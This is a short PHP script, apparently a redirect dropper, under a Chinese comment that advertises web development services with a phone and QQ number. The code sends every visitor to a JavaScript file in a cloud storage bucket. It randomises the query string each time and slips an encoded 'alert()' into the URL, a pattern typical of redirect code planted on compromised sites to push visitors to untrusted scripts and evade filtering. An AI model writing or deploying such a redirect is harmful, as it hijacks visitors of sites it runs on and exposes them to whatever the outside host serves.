<?php
/*
*	我们的技术范围有：PHP，JAVASCRIPT，JQUERY，MYSQL，HTML，H5，CSS，THINKPHP，ECSHOP，DEDECMS，PHPCMS，APACHE，IIS，图片处理，UI设计，SEO技术顾问等。电话：18729480012，企鹅：3379530015。
*/
$urls=array(
	'http://splb5.s3.cn-north-1.jdcloud-oss.com/i.js?m={WWW}&_wv=3&alert%28%29id={NNNN}',
	'http://splb5.s3.cn-north-1.jdcloud-oss.com/i.js?m={WWW}&_wv=3&alert%28%29id={NNNN}',
);
$url = preg_replace_callback('/\{([NWD]+)\}/iu',function($a){
	$h='';
	$a[1]=strtoupper($a[1]);
	for($i=0;$i<strlen($a[1]);$i++){
		if('N'==$a[1][$i]){
			$h.=mt_rand(0,9);
		}else if('D'==$a[1][$i]){
			$h.=chr(mt_rand(65,90));
		}else if('W'==$a[1][$i]){
			$h.= chr(mt_rand(97,122));
		}
	}
	return $h;
},$urls[array_rand($urls)]);
header("Location: {$url}");